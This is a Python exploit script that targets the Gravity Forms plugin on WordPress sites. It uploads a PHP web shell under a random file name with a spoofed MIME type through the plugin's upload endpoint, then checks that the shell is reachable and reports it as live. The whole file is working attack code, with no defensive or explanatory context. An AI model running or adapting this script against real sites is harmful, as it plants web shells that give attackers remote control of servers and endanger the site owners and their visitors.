import requests
import os
import random
import string

def random_filename(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + '.php'

def exploit(site_url):
    print(f"[*] Targeting Gravity Forms on: {site_url}")
    exploit_url = f"{site_url}/?gf_page=upload"
    
    shell_name = random_filename()
    payload_path = 'payloads/simple_shell.php'

    if not os.path.exists(payload_path):
        print("[-] Shell payload not found!")
        return False, None

    files = {
        'file': (shell_name, open(payload_path, 'rb'), 'application/octet-stream')  # Better mime spoofing
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0)',
    }

    try:
        r = requests.post(exploit_url, files=files, headers=headers, timeout=10)
        print(f"[+] Upload response status: {r.status_code}")

        if r.status_code == 200:
            shell_url = f"{site_url}/wp-content/uploads/gravity_forms/{shell_name}"
            print(f"[*] Attempting to access uploaded shell at: {shell_url}")
            verify = requests.get(shell_url, headers=headers, timeout=10)

            if verify.status_code == 200:
                print(f"[âœ”] Gravity Forms exploited! Shell is live: {shell_url}")
                return True, shell_url
            else:
                print(f"[x] Upload succeeded, but shell not accessible. Got HTTP {verify.status_code}")
        else:
            print(f"[-] Upload failed with status: {r.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Request error: {e}")

    print("[-] Gravity Forms exploit failed.")
    return False, None
